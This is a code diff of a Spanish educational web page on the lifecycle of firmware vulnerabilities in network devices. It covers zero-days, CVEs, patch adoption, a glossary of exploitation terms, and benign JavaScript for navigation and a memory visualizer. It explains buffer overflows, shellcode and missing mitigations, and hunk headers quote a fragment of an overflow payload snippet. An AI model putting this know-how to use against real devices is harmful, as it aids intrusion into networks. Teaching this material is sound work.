-        <h4>¿Por qué es devastadora esta fase? Cuatro razones:</h4>
-        <div class="g2" style="margin:.75rem 0;">
-          <div class="card red">
-            <div class="card-label" style="color:var(--red);">No hay parche</div>
-            <p>El fabricante no puede publicar un parche de algo que no sabe que existe. No hay nada que instalar. El administrador más diligente del mundo no puede defenderse.</p>
-          </div>
-          <div class="card red">
-            <div class="card-label" style="color:var(--red);">No hay detección</div>
-            <p>Los antivirus y sistemas IDS/IPS buscan firmas conocidas de ataques. Un zero-day no tiene firma — pasa completamente invisible a través de todas las defensas basadas en firmas.</p>
-          </div>
-          <div class="card red">
-            <div class="card-label" style="color:var(--red);">No hay CVE</div>
-            <p>No existe un número público que identifique el fallo. Los administradores no pueden buscar información, no reciben alertas de seguridad, no saben qué buscar en los logs.</p>
-          </div>
-          <div class="card red">
-            <div class="card-label" style="color:var(--red);">No hay alerta posible</div>
-            <p>Los boletines de seguridad de fabricantes y CERTs solo avisan de vulnerabilidades conocidas. Nadie puede avisar de algo que no está en los registros.</p>
-          </div>
+        <div class="g2" style="margin:.75rem 0">
+          <div class="card red"><div class="card-label" style="color:var(--red)">No hay parche</div><p>El fabricante no puede publicar lo que no sabe que existe. El administrador más diligente no puede defenderse.</p></div>
+          <div class="card red"><div class="card-label" style="color:var(--red)">No hay detección</div><p>Los antivirus buscan firmas conocidas. Un zero-day no tiene firma — pasa invisible a todas las defensas basadas en firmas.</p></div>
+          <div class="card red"><div class="card-label" style="color:var(--red)">No hay CVE</div><p>Los administradores no pueden buscar información, no reciben alertas, no saben qué buscar en los logs.</p></div>
+          <div class="card red"><div class="card-label" style="color:var(--red)">No hay alerta posible</div><p>Los boletines de seguridad solo avisan de vulnerabilidades conocidas. Nadie puede avisar de algo que no está en los registros.</p></div>
         </div>
-
-        <h4>¿Cuánto puede durar la Zero-Day Window?</h4>
-        <p>Varía enormemente — de días a <strong>años</strong>. Depende de si alguien más lo descubre independientemente, si el fabricante hace auditorías proactivas de seguridad, o si el fallo queda tan oscuro que solo un grupo muy reducido lo conoce. Los zero-days más valiosos — en dispositivos muy desplegados como firewalls de Cisco o Fortinet — se venden entre $100,000 y $2,500,000 en mercados especializados.</p>
-
-        <div class="analogy">
-          <div class="analogy-label">ANALOGÍA — La llave maestra con defecto secreto</div>
-          <p>Imagina que alguien descubrió que la llave maestra del edificio de tu empresa tiene un defecto de fabricación: cualquier llave con cierta forma específica abre todas las puertas. El fabricante de cerraduras no lo sabe. Tú no lo sabes. El que lo descubrió tiene acceso libre a todas las oficinas en cualquier momento, y lo único que te protegería (cambiar todas las cerraduras) es algo que nadie te ha dicho que tienes que hacer — porque nadie más sabe que el problema existe.</p>
-        </div>
+        <p>¿Cuánto puede durar? De días a <strong>años</strong>. Los zero-days de firewalls muy desplegados (Cisco, Fortinet, Palo Alto) se venden entre $100,000 y $2,500,000.</p>
+        <div class="analogy"><div class="analogy-label">ANALOGÍA — La llave maestra con defecto secreto</div><p>Alguien descubrió que la llave maestra de tu edificio tiene un defecto: cualquier llave con cierta forma específica abre todas las puertas. El fabricante no lo sabe. Tú no lo sabes. El que lo descubrió tiene acceso libre en cualquier momento — y lo único que te protegería (cambiar todas las cerraduras) es algo que nadie te ha dicho que tienes que hacer.</p></div>
       </div>
     </div>
 
@@ -883,41 +683,12 @@ payload = <span class="s">"A"</span> * 64           <span class="c"># llenar exa
         <span class="tl-hint">▶ clic para expandir</span>
       </button>
       <div class="tl-body">
-        <h4>¿Qué es un CVE?</h4>
-        <p><strong>CVE</strong> significa Common Vulnerabilities and Exposures. Es un sistema de identificación pública de vulnerabilidades mantenido por MITRE Corporation. Cada fallo conocido recibe un número único con el formato <code style="font-family:var(--mono);font-size:12px;color:var(--accent);">CVE-AÑO-NÚMERO</code>.</p>
-        <p>Ejemplos famosos: <span class="badge b-red">CVE-2021-44228</span> (Log4Shell, CVSS 10.0), <span class="badge b-red">CVE-2019-1653</span> (Cisco RV320 RCE).</p>
-
-        <div class="g2" style="margin:.75rem 0;">
-          <div class="card">
-            <div class="card-label">¿Qué contiene un CVE?</div>
-            <p>Descripción técnica del fallo, sistemas y versiones afectadas, puntuación de severidad CVSS (del 0 al 10), referencias a parches disponibles, y enlaces a pruebas de concepto (PoC) si existen.</p>
-          </div>
-          <div class="card">
-            <div class="card-label">CVSS — ¿Cómo se puntúa?</div>
-            <p>Considera: vector de ataque (¿remoto o local?), complejidad (¿difícil o fácil?), privilegios requeridos (¿ninguno, usuario, admin?), e impacto en confidencialidad, integridad y disponibilidad. CVSS 9.0-10.0 = crítico.</p>
-          </div>
+        <p><strong>CVE</strong> (Common Vulnerabilities and Exposures) — sistema de identificación pública mantenido por MITRE. Formato: <code style="font-family:var(--mono);font-size:11px;color:var(--ac)">CVE-AÑO-NÚMERO</code>. Ejemplos: <span class="badge b-red">CVE-2021-44228</span> (Log4Shell, CVSS 10.0), <span class="badge b-red">CVE-2019-1653</span> (Cisco RV320).</p>
+        <div class="g2" style="margin:.75rem 0">
+          <div class="card"><div class="card-label">¿Qué contiene un CVE?</div><p>Descripción técnica del fallo, sistemas afectados, puntuación CVSS (0-10), referencias a parches, y enlaces a pruebas de concepto si existen.</p></div>
+          <div class="card"><div class="card-label">CVSS — ¿Cómo se puntúa?</div><p>Considera: vector de ataque (remoto/local), complejidad, privilegios requeridos, e impacto en confidencialidad, integridad y disponibilidad. CVSS 9.0-10.0 = crítico.</p></div>
         </div>
-
-        <h4>La divulgación responsable — el proceso ideal</h4>
-        <div class="steps" style="margin-top:.75rem;">
-          <div class="step">
-            <div class="step-body"><p>El investigador contacta al fabricante de forma privada y le entrega todos los detalles técnicos del fallo.</p></div>
-          </div>
-          <div class="step">
-            <div class="step-body"><p>Se acuerda un plazo razonable — generalmente <strong>90 días</strong> — para que el fabricante desarrolle y publique el parche.</p></div>
-          </div>
-          <div class="step">
-            <div class="step-body"><p>El fabricante desarrolla, prueba y publica el parche. Se asigna el número CVE. Se notifica a los administradores.</p></div>
-          </div>
-          <div class="step">
-            <div class="step-body"><p>Si el fabricante no responde o no publica en el plazo, el investigador publica el fallo de todas formas — para que los usuarios sepan el riesgo aunque no haya parche.</p></div>
-          </div>
-        </div>
-
-        <div class="important">
-          <div class="important-label">EL PROBLEMA PARADÓJICO DE LA DIVULGACIÓN</div>
-          <p>Una vez que el CVE es público, <strong>los ataques se disparan</strong>. Ahora todos — incluidos atacantes sin mucho conocimiento técnico — saben exactamente qué buscar. Se publican exploits listos para usar. Los grupos de hackers automatizan el escaneo de internet buscando dispositivos vulnerables. El tiempo para aplicar el parche antes de ser atacado se comprime de meses a <em>días u horas</em>.</p>
-        </div>
+        <div class="important"><div class="important-label">EL PROBLEMA PARADÓJICO DE LA DIVULGACIÓN</div><p>Una vez que el CVE es público, <strong>los ataques se disparan</strong>. Todos — incluidos atacantes sin mucho conocimiento — saben exactamente qué buscar. El tiempo para aplicar el parche antes de ser atacado se comprime a <em>días u horas</em>.</p></div>
       </div>
     </div>
 
@@ -929,43 +700,17 @@ payload = <span class="s">"A"</span> * 64           <span class="c"># llenar exa
         <span class="tl-hint">▶ clic para expandir</span>
       </button>
       <div class="tl-body">
-        <h4>¿El parche lo resuelve todo?</h4>
-        <p>En teoría, sí. El parche corrige el código vulnerable. En la práctica, <strong>que exista el parche no significa que se aplique</strong>. Y en firmware, esto es especialmente grave por razones muy concretas:</p>
-
-        <div class="g3" style="margin:.75rem 0;">
-          <div class="card red">
-            <div class="card-label" style="color:var(--red);">Miedo a dejar el dispositivo inoperable</div>
-            <p>Una actualización de firmware fallida puede "brickear" el dispositivo — dejarlo completamente inoperable. Si eso le pasa al firewall principal, toda la empresa pierde conectividad. Los administradores lo saben y dudan.</p>
-          </div>
-          <div class="card red">
-            <div class="card-label" style="color:var(--red);">Proceso complejo y planificado</div>
-            <p>Actualizar firmware enterprise requiere: ventana de mantenimiento fuera de horario, backup completo de la configuración, procedimiento de rollback si falla, pruebas post-actualización. No es un clic.</p>
-          </div>
-          <div class="card red">
-            <div class="card-label" style="color:var(--red);">Dispositivos EoL sin parche disponible</div>
-            <p>Si el equipo llegó a fin de soporte, el fabricante no publica parche para esa versión. La única solución es reemplazar el hardware — caro, complejo, y disruptivo para la operación.</p>
-          </div>
+        <div class="g3" style="margin:.75rem 0">
+          <div class="card red"><div class="card-label" style="color:var(--red)">Miedo a brickear el dispositivo</div><p>Una actualización de firmware fallida puede dejar el dispositivo inoperable. Si le pasa al firewall principal, toda la empresa pierde conectividad.</p></div>
+          <div class="card red"><div class="card-label" style="color:var(--red)">Proceso complejo</div><p>Requiere: ventana de mantenimiento fuera de horario, backup de configuración, procedimiento de rollback, pruebas post-actualización. No es un clic.</p></div>
+          <div class="card red"><div class="card-label" style="color:var(--red)">Dispositivos EoL</div><p>Si el equipo llegó a fin de soporte, no hay parche. La única solución es reemplazar el hardware — caro, complejo y disruptivo.</p></div>
         </div>
-
-        <h4>Datos reales: adopción de parches — 90 días después de publicación</h4>
-        <div class="bar-row" style="margin-top:.75rem;">
-          <div class="bar-meta"><span class="bar-name">Sistemas operativos de escritorio (Windows/Mac/Linux)</span><span class="bar-val">87%</span></div>
-          <div class="bar-track"><div class="bar-fill bf-ok" style="width:87%"></div></div>
-        </div>
-        <div class="bar-row" style="margin-top:.5rem;">
-          <div class="bar-meta"><span class="bar-name">Servidores gestionados en cloud o datacenter</span><span class="bar-val">62%</span></div>
-          <div class="bar-track"><div class="bar-fill bf-warn" style="width:62%"></div></div>
-        </div>
-        <div class="bar-row" style="margin-top:.5rem;">
-          <div class="bar-meta"><span class="bar-name">Firmware de routers y firewalls empresariales</span><span class="bar-val">23%</span></div>
-          <div class="bar-track"><div class="bar-fill bf-danger" style="width:23%"></div></div>
-        </div>
-        <p style="margin-top:.75rem;font-size:13px;">Solo el 23% de los routers y firewalls aplican el parche en los primeros 90 días. <strong style="color:var(--red);">El 77% permanece vulnerable</strong> durante meses o años después de que la solución está disponible.</p>
-
-        <div class="important" style="margin-top:1rem;">
-          <div class="important-label">CONCLUSIÓN FINAL DEL CICLO</div>
-          <p>El ciclo completo puede tomar años desde el fallo hasta la protección real. Y en muchos dispositivos — especialmente los más viejos — ese ciclo nunca termina: el EoL llega antes que el parche, y el hardware queda vulnerable de forma permanente. Por eso los dispositivos perimetrales son el vector favorito de grupos APT (amenazas persistentes avanzadas) — son la puerta que nadie vigila bien.</p>
-        </div>
+        <h4>Datos reales: adopción de parches en 90 días</h4>
+        <div class="bar-row" style="margin-top:.65rem"><div class="bar-meta"><span class="bar-name">Sistemas operativos de escritorio</span><span class="bar-val">87%</span></div><div class="bar-track"><div class="bar-fill bf-ok" style="width:87%"></div></div></div>
+        <div class="bar-row" style="margin-top:.4rem"><div class="bar-meta"><span class="bar-name">Servidores gestionados en cloud</span><span class="bar-val">62%</span></div><div class="bar-track"><div class="bar-fill bf-warn" style="width:62%"></div></div></div>
+        <div class="bar-row" style="margin-top:.4rem"><div class="bar-meta"><span class="bar-name">Firmware de routers y firewalls</span><span class="bar-val">23%</span></div><div class="bar-track"><div class="bar-fill bf-danger" style="width:23%"></div></div></div>
+        <p style="margin-top:.65rem;font-size:13px">Solo el 23% aplica el parche en 90 días. <strong style="color:var(--red)">El 77% permanece vulnerable</strong> durante meses o años después de que la solución está disponible.</p>
+        <div class="important" style="margin-top:1rem"><div class="important-label">CONCLUSIÓN FINAL DEL CICLO</div><p>El ciclo completo puede tomar años. Y en muchos dispositivos — especialmente los más viejos — ese ciclo nunca termina: el EoL llega antes que el parche, y el hardware queda vulnerable de forma permanente. Por eso los dispositivos perimetrales son el vector favorito de grupos APT.</p></div>
       </div>
     </div>
 
@@ -974,21 +719,19 @@ payload = <span class="s">"A"</span> * 64           <span class="c"># llenar exa
   <hr>
   <h3>Resumen completo del ciclo</h3>
   <table class="stbl">
-    <thead>
-      <tr><th>Fase</th><th>¿Qué pasa?</th><th>Atacante</th><th>Defensor</th><th>Riesgo</th></tr>
-    </thead>
+    <thead><tr><th>Fase</th><th>¿Qué pasa?</th><th>Atacante</th><th>Defensor</th><th>Riesgo</th></tr></thead>
     <tbody>
-      <tr><td>1 — Introducción</td><td>Fallo escrito en el código</td><td>No sabe que existe</td><td>No sabe que existe</td><td><span class="badge b-blue">Latente</span></td></tr>
-      <tr><td>2 — Descubrimiento</td><td>Alguien lo encuentra</td><td>Tiene ventaja (si es black hat)</td><td>No sabe nada</td><td><span class="badge b-yellow">Alto</span></td></tr>
-      <tr><td>3 — Zero-Day</td><td>Explotación silenciosa</td><td>Explotando sin restricciones</td><td>Sin defensa posible</td><td><span class="badge b-red">Máximo</span></td></tr>
-      <tr><td>4 — CVE público</td><td>Fallo conocido, parche en desarrollo</td><td>Automatiza ataques masivos</td><td>Sabe el riesgo, espera parche</td><td><span class="badge b-red">Muy alto</span></td></tr>
-      <tr><td>5 — Parche disponible</td><td>Solución existe pero no se aplica</td><td>Ataca a los no actualizados</td><td>Puede protegerse si actúa</td><td><span class="badge b-yellow">Moderado</span></td></tr>
-      <tr><td>6 — Parche aplicado</td><td>Dispositivo protegido</td><td>Busca próximo vector</td><td>Protegido de este fallo</td><td><span class="badge b-green">Bajo</span></td></tr>
+      <tr><td>1 — Introducción</td><td>Fallo escrito</td><td>No sabe que existe</td><td>No sabe que existe</td><td><span class="badge b-blue">Latente</span></td></tr>
+      <tr><td>2 — Descubrimiento</td><td>Alguien lo encuentra</td><td>Tiene ventaja (black hat)</td><td>No sabe nada</td><td><span class="badge b-yellow">Alto</span></td></tr>
+      <tr><td>3 — Zero-Day</td><td>Explotación silenciosa</td><td>Sin restricciones</td><td>Sin defensa posible</td><td><span class="badge b-red">Máximo</span></td></tr>
+      <tr><td>4 — CVE público</td><td>Fallo conocido</td><td>Automatiza ataques masivos</td><td>Sabe el riesgo</td><td><span class="badge b-red">Muy alto</span></td></tr>
+      <tr><td>5 — Parche disponible</td><td>Solución existe</td><td>Ataca a los no actualizados</td><td>Puede protegerse</td><td><span class="badge b-yellow">Moderado</span></td></tr>
+      <tr><td>6 — Parche aplicado</td><td>Protegido</td><td>Busca próximo vector</td><td>Protegido de este fallo</td><td><span class="badge b-green">Bajo</span></td></tr>
     </tbody>
   </table>
 </section>
 
-<!-- ═══════════════════════════ SECCIÓN 4 — GLOSARIO ═══════════════════════════ -->
+<!-- ═══ SECCIÓN 4: GLOSARIO ═══ -->
 <section class="section" id="s4">
   <div class="s-num">REFERENCIA</div>
   <h2 class="s-title">Glosario Completo</h2>
@@ -996,86 +739,74 @@ payload = <span class="s">"A"</span> * 64           <span class="c"># llenar exa
 
   <div class="glossary-item">
     <div class="g-term">Firmware <span class="g-tag">sustantivo</span></div>
-    <div class="g-def">Software grabado permanentemente en un chip de memoria flash dentro de un dispositivo de hardware. Es el sistema operativo del dispositivo — no puede borrarse sin perder la funcionalidad del hardware. Escrito normalmente en C o C++, de código propietario (cerrado), y actualizado muy raramente. En dispositivos de red como routers y firewalls, controla todo: el arranque, el procesamiento de paquetes, la autenticación, las reglas de seguridad.</div>
+    <div class="g-def">Software grabado permanentemente en un chip de memoria flash dentro de un dispositivo de hardware. Es el sistema operativo del dispositivo — no puede borrarse sin perder la funcionalidad del hardware. Escrito normalmente en C o C++, de código propietario (cerrado), y actualizado muy raramente. En routers y firewalls, controla todo: arranque, procesamiento de paquetes, autenticación, reglas de seguridad.</div>
   </div>
-
   <div class="glossary-item">
     <div class="g-term">RCE — Remote Code Execution <span class="g-tag">clase de vulnerabilidad</span></div>
-    <div class="g-def">Vulnerabilidad que permite a un atacante <strong>ejecutar código arbitrario en un sistema remoto</strong> solo a través de la red, sin acceso físico. Es una de las vulnerabilidades más críticas existentes (CVSS máximo 10.0). El resultado suele ser una shell con los privilegios del proceso vulnerable — en firmware, casi siempre root. Se puede lograr mediante múltiples técnicas: inyección de comandos, buffer overflow, deserialización insegura, vulnerabilidades en parsers, etc.</div>
+    <div class="g-def">Vulnerabilidad que permite a un atacante <strong>ejecutar código arbitrario en un sistema remoto</strong> solo a través de la red, sin acceso físico. Es una de las vulnerabilidades más críticas existentes (CVSS máximo 10.0). El resultado suele ser una shell con los privilegios del proceso vulnerable — en firmware, casi siempre root. Se puede lograr mediante: inyección de comandos, buffer overflow, deserialización insegura, vulnerabilidades en parsers, etc.</div>
   </div>
-
   <div class="glossary-item">
     <div class="g-term">Buffer Overflow <span class="g-tag">técnica de explotación</span></div>
-    <div class="g-def">Error de programación que permite escribir más datos de los que caben en una zona de memoria reservada (buffer). Los bytes extras sobrescriben zonas adyacentes del stack, incluyendo la dirección de retorno — que le indica al procesador a dónde saltar cuando termina una función. Si se sobrescribe con la dirección del shellcode del atacante, este gana control de ejecución. En firmware sin ASLR, DEP, ni stack canaries, este ataque es particularmente efectivo porque no hay barreras que lo detengan.</div>
+    <div class="g-def">Error de programación que permite escribir más datos de los que caben en una zona de memoria reservada (buffer). Los bytes extras sobrescriben zonas adyacentes del stack, incluyendo la dirección de retorno. Si se sobrescribe con la dirección del shellcode del atacante, este gana control de ejecución. En firmware sin ASLR, DEP ni stack canaries, este ataque es particularmente efectivo porque no hay barreras que lo detengan.</div>
   </div>
-
   <div class="glossary-item">
     <div class="g-term">Zero-Day <span class="g-tag">tipo de vulnerabilidad</span></div>
-    <div class="g-def">Vulnerabilidad conocida por actores maliciosos pero desconocida para el fabricante del producto afectado. El nombre viene de "zero days to fix" — el fabricante tiene cero días para arreglarlo porque no sabe que existe. Durante la zero-day window no hay parche, no hay CVE, no hay firma antivirus, y no hay defensa basada en conocimiento. Los zero-days de dispositivos muy desplegados (firewalls Cisco, Fortinet, Palo Alto) se venden entre $100,000 y $2,500,000 en mercados especializados.</div>
+    <div class="g-def">Vulnerabilidad conocida por actores maliciosos pero desconocida para el fabricante. "Zero days to fix" — el fabricante tiene cero días para arreglarlo porque no sabe que existe. Durante la zero-day window no hay parche, no hay CVE, no hay firma antivirus, y no hay defensa basada en conocimiento. Los zero-days de dispositivos muy desplegados se venden entre $100,000 y $2,500,000.</div>
   </div>
-
   <div class="glossary-item">
     <div class="g-term">CVE — Common Vulnerabilities and Exposures <span class="g-tag">sistema de identificación</span></div>
-    <div class="g-def">Sistema estándar de identificación pública de vulnerabilidades de seguridad, mantenido por MITRE Corporation y financiado por el Departamento de Seguridad Nacional de EE.UU. Cada vulnerabilidad conocida recibe un identificador único formato CVE-AÑO-NÚMERO (ej: CVE-2021-44228). La base de datos NVD del NIST enriquece cada CVE con puntuación CVSS, descripción técnica detallada, y referencias a soluciones disponibles.</div>
+    <div class="g-def">Sistema estándar de identificación pública de vulnerabilidades mantenido por MITRE Corporation. Cada vulnerabilidad conocida recibe un identificador único formato CVE-AÑO-NÚMERO. La base de datos NVD del NIST enriquece cada CVE con puntuación CVSS, descripción técnica y referencias a soluciones.</div>
   </div>
-
   <div class="glossary-item">
     <div class="g-term">CVSS — Common Vulnerability Scoring System <span class="g-tag">métrica</span></div>
-    <div class="g-def">Sistema estándar para puntuar la severidad de vulnerabilidades del 0.0 al 10.0. Evalúa: vector de ataque (red/local/físico), complejidad (baja/alta), privilegios requeridos (ninguno/bajo/alto), necesidad de interacción del usuario, e impacto en confidencialidad, integridad y disponibilidad. Escalas: 0.0 = ninguno, 0.1-3.9 = bajo, 4.0-6.9 = medio, 7.0-8.9 = alto, 9.0-10.0 = crítico. Un RCE sin autenticación en dispositivo de red típicamente obtiene CVSS 9.8-10.0.</div>
+    <div class="g-def">Sistema estándar para puntuar la severidad de vulnerabilidades del 0.0 al 10.0. Evalúa: vector de ataque (red/local/físico), complejidad, privilegios requeridos, necesidad de interacción del usuario, e impacto en confidencialidad, integridad y disponibilidad. Escalas: 0.0=ninguno, 0.1-3.9=bajo, 4.0-6.9=medio, 7.0-8.9=alto, 9.0-10.0=crítico. Un RCE sin autenticación típicamente obtiene CVSS 9.8-10.0.</div>
   </div>
-
   <div class="glossary-item">
     <div class="g-term">ASLR <span class="g-tag">mecanismo de defensa</span></div>
-    <div class="g-def">Address Space Layout Randomization. Técnica implementada en el SO que aleatoriza la posición en memoria de el stack, el heap, y las bibliotecas en cada ejecución del programa. Impide que un atacante pueda predecir las direcciones de memoria necesarias para un exploit de buffer overflow. Presente en Linux desde 2005, Windows desde Vista, macOS desde 10.5. Ausente en la mayoría del firmware de dispositivos de red por razones de determinismo y rendimiento.</div>
+    <div class="g-def">Address Space Layout Randomization. Aleatoriza la posición en memoria del stack, heap y bibliotecas en cada ejecución. Impide que un atacante pueda predecir las direcciones necesarias para un exploit de buffer overflow. Presente en Linux desde 2005, Windows desde Vista, macOS desde 10.5. Ausente en la mayoría del firmware por razones de determinismo y rendimiento.</div>
   </div>
-
   <div class="glossary-item">
-    <div class="g-term">DEP / NX — Data Execution Prevention / No-Execute <span class="g-tag">mecanismo de defensa</span></div>
-    <div class="g-def">Mecanismo que marca regiones de memoria como no ejecutables. El stack y el heap (zonas de datos) tienen el bit NX activado — el procesador rechaza ejecutar código desde esas zonas. Contramedida directa contra shellcode inyectado en buffers. Requiere soporte hardware (bit NX en Intel/AMD, bit XN en ARM) y configuración explícita del SO. El firmware de dispositivos embebidos frecuentemente no lo activa, incluso cuando el hardware lo soportaría.</div>
+    <div class="g-term">DEP / NX — Data Execution Prevention <span class="g-tag">mecanismo de defensa</span></div>
+    <div class="g-def">Mecanismo que marca regiones de memoria como no ejecutables. El stack y el heap tienen el bit NX activado — el procesador rechaza ejecutar código desde esas zonas. Contramedida directa contra shellcode inyectado en buffers. Requiere soporte hardware y configuración explícita. El firmware frecuentemente no lo activa incluso cuando el hardware lo soportaría.</div>
   </div>
-
   <div class="glossary-item">
     <div class="g-term">Stack Canary <span class="g-tag">mecanismo de defensa</span></div>
-    <div class="g-def">Valor secreto aleatorio insertado por el compilador entre las variables locales y la dirección de retorno en el stack. Antes de retornar de una función, el código verifica que ese valor no haya cambiado. Si un buffer overflow sobreescribió la dirección de retorno, necesariamente también sobreescribió el canario — la verificación falla y el programa termina en lugar de ejecutar shellcode. Se activa compilando con el flag -fstack-protector de GCC. El nombre viene de los canarios que los mineros usaban para detectar gas tóxico.</div>
+    <div class="g-def">Valor secreto aleatorio insertado por el compilador entre las variables locales y la dirección de retorno en el stack. Antes de retornar de una función, el código verifica que ese valor no haya cambiado. Si un buffer overflow sobreescribió la dirección de retorno, necesariamente también sobreescribió el canario — el programa termina en lugar de ejecutar shellcode. Se activa compilando con el flag -fstack-protector de GCC.</div>
   </div>
-
   <div class="glossary-item">
     <div class="g-term">Shellcode <span class="g-tag">payload malicioso</span></div>
-    <div class="g-def">Código máquina pequeño y cuidadosamente construido que un atacante inyecta en la memoria de un proceso vulnerable como parte de un exploit. Su objetivo clásico es abrir una shell (terminal de comandos con acceso al SO) — de ahí el nombre. Tiene restricciones técnicas específicas: no puede contener bytes nulos (\x00) que interrumpirían funciones de copia de strings en C, y debe ser autocontenido (no depender de direcciones absolutas cuando hay ASLR).</div>
+    <div class="g-def">Código máquina pequeño y cuidadosamente construido que un atacante inyecta en la memoria de un proceso vulnerable. Su objetivo clásico: abrir una shell (terminal de comandos) con acceso al SO. Tiene restricciones: no puede contener bytes nulos (\x00) que interrumpirían funciones de copia de strings en C, y debe ser autocontenido.</div>
   </div>
-
   <div class="glossary-item">
-    <div class="g-term">Dispositivo perimetral <span class="g-tag">concepto de arquitectura de red</span></div>
-    <div class="g-def">Dispositivo de red ubicado en el límite entre la red interna (considerada confiable) y la red externa (internet, no confiable). Incluye: routers, firewalls, VPN concentrators, proxies, IDS/IPS. Son el primer y último punto de control del tráfico. Su compromiso es catastrófico: el atacante obtiene visibilidad y control sobre todo el tráfico que pasa, puede abrir puertas a la red interna, y tiene posición privilegiada para atacar cualquier sistema interno.</div>
+    <div class="g-term">Dispositivo perimetral <span class="g-tag">arquitectura de red</span></div>
+    <div class="g-def">Dispositivo ubicado en el límite entre la red interna (confiable) y la red externa (internet). Incluye: routers, firewalls, VPN concentrators, proxies, IDS/IPS. Son el primer y último punto de control del tráfico. Su compromiso es catastrófico: el atacante obtiene visibilidad y control sobre todo el tráfico, puede abrir puertas a la red interna, y tiene posición privilegiada para atacar cualquier sistema interno.</div>
   </div>
-
   <div class="glossary-item">
-    <div class="g-term">EoL / Fin de soporte (End of Life) <span class="g-tag">estado del producto</span></div>
-    <div class="g-def">Estado declarado por el fabricante en que deja de publicar actualizaciones, parches de seguridad, y soporte técnico para un producto. Los dispositivos en EoL continúan funcionando — el problema es que las vulnerabilidades descubiertas después no tendrán corrección jamás. La única solución segura es reemplazar el hardware. En redes empresariales es muy común encontrar dispositivos en EoL porque el proceso de reemplazo es costoso y disruptivo.</div>
+    <div class="g-term">EoL — End of Life / Fin de soporte <span class="g-tag">estado del producto</span></div>
+    <div class="g-def">Estado en que el fabricante deja de publicar actualizaciones, parches de seguridad y soporte técnico. Los dispositivos en EoL continúan funcionando — el problema es que las vulnerabilidades descubiertas después no tendrán corrección jamás. La única solución segura es reemplazar el hardware.</div>
   </div>
-
-  <div class="glossary-item">
-    <div class="g-term">Ingeniería inversa (Reverse Engineering) <span class="g-tag">técnica</span></div>
-    <div class="g-def">Proceso de analizar un sistema — programa, firmware, hardware — para entender su funcionamiento sin tener acceso al código fuente original. Para firmware: se descarga el archivo de actualización del sitio del fabricante, se extrae con herramientas como binwalk, y se analiza el código máquina con descompiladores como Ghidra (NSA, open source) o IDA Pro. Es la única forma que tienen investigadores externos de buscar vulnerabilidades en firmware propietario. Es lento, difícil, e inevitablemente incompleto.</div>
-  </div>
-
   <div class="glossary-item">
     <div class="g-term">APT — Advanced Persistent Threat <span class="g-tag">categoría de atacante</span></div>
-    <div class="g-def">Grupos de atacantes altamente sofisticados, generalmente patrocinados por estados-nación, que realizan ataques dirigidos, sigilosos y prolongados contra objetivos específicos. Son los principales compradores y usuarios de zero-days. Prefieren comprometer dispositivos perimetrales porque les da acceso persistente y difícil de detectar a las redes objetivo. Ejemplos conocidos: Volt Typhoon (China), Fancy Bear (Rusia), Lazarus Group (Corea del Norte).</div>
+    <div class="g-def">Grupos de atacantes altamente sofisticados, generalmente patrocinados por estados-nación, que realizan ataques dirigidos, sigilosos y prolongados. Son los principales compradores y usuarios de zero-days. Prefieren comprometer dispositivos perimetrales porque les da acceso persistente y difícil de detectar. Ejemplos: Volt Typhoon (China), Fancy Bear (Rusia), Lazarus Group (Corea del Norte).</div>
+  </div>
+  <div class="glossary-item">
+    <div class="g-term">Ingeniería inversa <span class="g-tag">técnica</span></div>
+    <div class="g-def">Proceso de analizar un sistema sin tener acceso al código fuente original. Para firmware: se descarga el archivo de actualización del sitio del fabricante, se extrae con binwalk, y se analiza el código máquina con Ghidra (NSA, open source) o IDA Pro. Es la única forma que tienen investigadores externos de buscar vulnerabilidades en firmware propietario.</div>
   </div>
 </section>
 
-<!-- ═══════════════════════════ SECCIÓN 5 — REPASO ═══════════════════════════ -->
+<!-- ═══ SECCIÓN 5: REPASO ═══ -->
 <section class="section" id="s5">
   <div class="s-num">AUTOEVALUACIÓN</div>
   <h2 class="s-title">Preguntas de Repaso</h2>
-  <p class="s-lead">Verifica cuánto entendiste del contenido. Estas preguntas cubren los puntos clave de las tres diapositivas. Haz clic en la opción que creas correcta — recibirás explicación detallada de por qué es correcta o incorrecta.</p>
+  <p class="s-lead">Verifica cuánto entendiste del contenido. Haz clic en la opción que creas correcta — recibirás explicación detallada.</p>
   <div id="quizContainer"></div>
 </section>
 
 </main>
 
 <script>
+// NAVIGATION
 function showS(id, btn) {
   document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
   document.querySelectorAll('.h-btn').forEach(b => b.classList.remove('active'));
@@ -1084,6 +815,19 @@ function showS(id, btn) {
   window.scrollTo(0,0);
 }
 
+function toggleMenu() {
+  document.getElementById('mobileNav').classList.toggle('open');
+}
+
+// Close mobile menu when clicking outside
+document.addEventListener('click', e => {
+  const nav = document.getElementById('mobileNav');
+  if (nav.classList.contains('open') && !nav.contains(e.target) && !e.target.closest('.menu-toggle')) {
+    nav.classList.remove('open');
+  }
+});
+
+// LAYER STACK
 function toggleLayer(id) {
   const d = document.getElementById(id);
   const isOpen = d.classList.contains('open');
@@ -1091,6 +835,7 @@ function toggleLayer(id) {
   if (!isOpen) d.classList.add('open');
 }
 
+// VULN TABS
 function showV(id, btn) {
   document.querySelectorAll('.vpanel').forEach(p => p.classList.remove('active'));
   document.querySelectorAll('.vtab').forEach(b => b.classList.remove('active'));
@@ -1098,129 +843,132 @@ function showV(id, btn) {
   btn.classList.add('active');
 }
 
+// TIMELINE
 function tlToggle(item) {
   const wasOpen = item.classList.contains('open');
   document.querySelectorAll('.tl-item').forEach(i => i.classList.remove('open'));
   if (!wasOpen) item.classList.add('open');
 }
 
-/* MEMORY VISUALIZER */
+// MEMORY VISUALIZER
 const N = 32;
-function buildGrid() {
+(function buildGrid() {
   const g = document.getElementById('memGrid');
   if (!g) return;
-  g.innerHTML = '';
   for (let i = 0; i < N; i++) {
     const c = document.createElement('div');
-    c.className = 'mc';
-    c.id = 'mc'+i;
-    c.textContent = '00';
+    c.className = 'mc'; c.id = 'mc'+i; c.textContent = '00';
     g.appendChild(c);
   }
-}
+})();
+
 function setRanges(ranges) {
   for (let i = 0; i < N; i++) {
     const c = document.getElementById('mc'+i);
-    if (!c) continue;
-    c.className = 'mc';
-    c.textContent = '00';
+    if (c) { c.className = 'mc'; c.textContent = '00'; }
   }
   ranges.forEach(([s,e,cls,val]) => {
     for (let i = s; i <= e; i++) {
       const c = document.getElementById('mc'+i);
-      if (!c) continue;
-      if (cls) c.classList.add(cls);
-      if (val) c.textContent = val;
+      if (c) { if (cls) c.classList.add(cls); if (val) c.textContent = val; }
     }
   });
 }
+
 function mStep(n) {
   const msgs = [
